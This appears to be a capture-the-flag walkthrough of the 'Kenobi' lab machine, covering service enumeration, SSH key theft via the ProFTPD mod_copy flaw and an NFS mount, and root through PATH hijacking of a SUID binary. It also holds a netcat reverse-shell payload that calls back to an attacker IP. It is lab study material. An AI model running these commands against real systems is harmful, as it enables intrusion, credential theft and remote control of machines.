===Kenobi 	Flutter Jul 21 2021===

# Recon #

----------------
	Scanning
----------------

- $ nmap -sV -sC -T5 -oN nmap_initial $IP

		'''
		21/tcp   open  ftp         ProFTPD 1.3.5

		22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)

		80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
			http-robots.txt: 1 disallowed entry
			/admin.html
			http-server-header: Apache/2.4.18 (Ubuntu)
			http-title: Site doesn't have a title (text/html).

		111/tcp  open  rpcbind     2-4 (RPC #100000)
			rpcinfo: 
				program version   port/proto  service
				100000  2,3,4        111/tcp  rpcbind
				100000  2,3,4        111/udp  rpcbind
				100003  2,3,4       2049/tcp  nfs
				100003  2,3,4       2049/udp  nfs
				100005  1,2,3      44931/udp  mountd
				100005  1,2,3      52979/tcp  mountd
				100021  1,3,4      38535/tcp  nlockmgr
				100021  1,3,4      56042/udp  nlockmgr
				100227  2,3         2049/tcp  nfs_acl
				100227  2,3         2049/udp  nfs_acl

		139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

		445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

		2049/tcp open  nfs_acl     2-3 (RPC #100227)
		'''


- $ enum4linux -a $IP > enum4_initial
	> Shares Discovered
	
		'''        
		print$          Disk      Printer Drivers
		anonymous       Disk      
		IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
		'''

	> Users Discovered
	
		'''
		KENOBI\nobody (Local User)
		Unix User\kenobi (Local User)
		'''


- $ smbclient //$IP/anonymous
	>  ls

		.                                   D        0  Wed Sep  4 11:49:09 2019
		..                                  D        0  Wed Sep  4 11:56:07 2019
		log.txt                             N    12237  Wed Sep  4 11:49:09 2019


- $ smbget smb://$IP/anonymous/log.txt


- log.txt

		'''
		Generating public/private rsa key pair.
		Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
		Created directory '/home/kenobi/.ssh'.
		Enter passphrase (empty for no passphrase): 
		Enter same passphrase again: 
		Your identification has been saved in /home/kenobi/.ssh/id_rsa.
		Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
		The key fingerprint is:
		SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
		'''


- $ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN rpc_initial $IP

		'''
		nfs-ls: Volume /var
			access: Read Lookup NoModify NoExtend NoDelete NoExecute
			PERMISSION  UID  GID  SIZE  TIME                 FILENAME
			rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
			rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
			rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
			rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
			rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
			rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
			rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
			rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
			rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
			rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www

		nfs-showmount: 
			/var *
		nfs-statfs: 
			Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
			/var        9204224.0  1836528.0  6877100.0  22%
		'''


# Intrusion and Exploitation #

- searchsploit proftpd 1.3.5

		ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
		ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
		ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt

- nc $IP 21
	> ProFTPD > help

		214 Direct comments to root@kenobi

	> ProFTPD > SITE CPFR /home/kenobi/.ssh/id_rsa
	
	> ProFTPD > SITE CPTO /var/tmp/id_rsa
	
		copied id_rsa to /var

### Getting kenobi's id_rsa on Attacker ###

- mkdir /mnt/kenobiNFS
- sudo mount $IP:/var /mnt/kenobiNFS

- ls -la /mnt/kenobiNFS/tmp/

		'''
		drwxrwxrwt  6 root   root   4096 Jul 28 20:24 .
		drwxr-xr-x 14 root   root   4096 Sep  4  2019 ..
		-rw-r--r--  1 ubuntu ubuntu 1675 Jul 28 20:24 id_rsa
		drwx------  3 root   root   4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
		drwx------  3 root   root   4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
		drwx------  3 root   root   4096 Jul 28 19:44 systemd-private-7d664ff888054bd68c221853288ac684-systemd-timesyncd.service-0n7DLl
		drwx------  3 root   root   4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
		'''

- cp /mnt/kenobiNFS/tmp/id_rsa .
- sudo chmod 600 id_rsa


### SSH ###

- ssh -i id_rsa kenobi@$IP
- ls -la

		'''
		drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
		drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
		lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
		-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
		-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
		drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
		-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
		drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
		drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
		-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
		-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
		'''

/home/kenobi/user.txt contain flag

# PrivEsc #

- sudo -l
	> password protected :c

- find / -type f -user root -perm -u=s 2>/dev/null

		'''
		/sbin/mount.nfs
		/usr/lib/policykit-1/polkit-agent-helper-1
		/usr/lib/dbus-1.0/dbus-daemon-launch-helper
		/usr/lib/snapd/snap-confine
		/usr/lib/eject/dmcrypt-get-device
		/usr/lib/openssh/ssh-keysign
		/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
		/usr/bin/chfn
		/usr/bin/newgidmap
		/usr/bin/pkexec
		/usr/bin/passwd
		/usr/bin/newuidmap
		/usr/bin/gpasswd
		/usr/bin/menu
		/usr/bin/sudo
		/usr/bin/chsh
		/usr/bin/newgrp
		/bin/umount
		/bin/fusermount
		/bin/mount
		/bin/ping
		/bin/su
		/bin/ping6
		'''

	> What the heck is /usr/bin/menu

- /usr/bin/menu

		'''
		1. status check
		2. kernel version
		3. ifconfig
		** Enter your choice :
		'''

- strings /usr/bin/menu

		'''
		1. status check
		2. kernel version
		3. ifconfig
		** Enter your choice :
		curl -I localhost
		uname -r
		ifconfig
		 Invalid choice
		'''

	> running curl, uname, and ifconfig as root


-----------------------
	Exploiting PATH
-----------------------

	- cd /tmp
	- echo /bin/sh > curl
	- chmod 777 curl
	- export PATH=/tmp:$PATH
	- /usr/bin/menu

	'''
	1. status check
	2. kernel version
	3. ifconfig
	** Enter your choice :1
	# id
	uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
	'''

- root gained


--------------------
	Better Shell
--------------------

### Attacker ###

- $ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.208.2 LPORT=4444
	> mkfifo /tmp/ksgcn; nc 10.10.208.2 4444 0</tmp/ksgcn | /bin/sh >/tmp/ksgcn 2>&1; rm /tmp/ksgcn

### Target ###

run payload

### Stabalisation ###

	- # python -c 'import pty;pty.spawn("/bin/bash")'
	- CTRL Z
	- $ stty raw -echo
	- $ fg
	- # export TERM=xterm
	
 \# cd /root
 
 
 \# ls -la

		'''
		drwx------  3 root root 4096 Sep  4  2019 .
		drwxr-xr-x 23 root root 4096 Sep  4  2019 ..
		lrwxrwxrwx  1 root root    9 Sep  4  2019 .bash_history -> /dev/null
		-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
		drwx------  2 root root 4096 Sep  4  2019 .cache
		-rw-r--r--  1 root root  148 Aug 17  2015 .profile
		-rw-r--r--  1 root root   33 Sep  4  2019 root.txt
		-rw-------  1 root root 5383 Sep  4  2019 .viminfo
		'''

/root/root.txt contains flag
